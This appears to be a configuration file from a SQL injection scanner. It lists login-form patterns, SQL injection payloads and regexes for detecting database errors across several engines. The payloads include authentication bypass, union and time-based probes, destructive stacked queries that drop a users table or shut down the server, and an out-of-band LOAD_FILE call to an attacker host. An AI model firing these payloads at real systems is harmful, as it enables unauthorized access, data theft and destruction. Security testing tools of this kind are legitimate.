logninputs = ['type="password"', 
            'placeholder="[Pp]assword"',
            'id="password"',
            'name="[Uu]sername"',
            'id="username"', 
            'name="[Ee]mail"',
            'type="email"',
            'id="login-button"',
            '[Ll]ogin',
            '[Ll]og [Ii]n']


# Added extra payloads to test Boolean and Time Based  blind SQLi, also added some checks for Union Based, Error based, Out of Bound, Stack queries SQLi's 
payloads = ["' or ''-'", 
            "admin' or '1'='1", 
            "' UNION ALL SELECT 1", 
            "AND 1=1 AND '%'='", 
            "' UNION ALL SELECT system_user(),user();#", 
            "' UNION select table_schema,table_name FROM information_Schema.tables;#", 
            "admin' and substring(password/text(),1,1)='7", 
            "' and substring(password/text(),1,1)='7", 
            "' or 1=1 limit 1 -- -+", 
            "'=or'",
            "' OR 'a'='a", 
            "' OR 'a'='b", 
            "' OR 1=1 --", 
            "' OR 1=2 --", 
            "' OR SLEEP(5) AND '1'='1", 
            "' OR SLEEP(5) AND '1'='2", 
            "' UNION SELECT 1,2,3,4,5 --", 
            "' UNION SELECT NULL,NULL,NULL --", 
            "' OR SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(0x7e,0x27,CAST(database() AS CHAR),0x27,0x7e)) FROM `information_schema`.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM `information_schema`.tables GROUP BY x)a --", 
            "' OR (SELECT 1 FROM (SELECT SLEEP(25))A) --", 
            "' OR (SELECT LOAD_FILE('\\\\attacker.com\\test.txt')) --", 
            "'; DROP TABLE users; --", 
            "'; SHUTDOWN; --"]



# Regex from Ekultek (https://github.com/Ekultek/Zeus-Scanner/blob/master/lib/core/settings.py) with some edits
Errors = {
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\.", r"MySQL Query fail.*", r"SQL syntax.*MariaDB server.*",r"SQL ERROR.*"),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\.", r"Warning.*PostgreSQL"),
    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server",
                            r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*",
                            r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
                            r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\.",
                            r"Msg \d+, Level \d+, State \d+", r"Unclosed quotation mark after the character string",
                            r"Microsoft OLE DB Provider for ODBC Drivers"),
    "Microsoft Access": (r"Microsoft Access Driver", r"Microsoft JET Database Engine", r"Access Database Engine"),
    "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Microsoft OLE DB Provider for Oracle",
            r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
    "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*",
            r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
    "Informix": (r"Warning.*ibase_.*", r"com.informix.jdbc"),
    "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*")
}

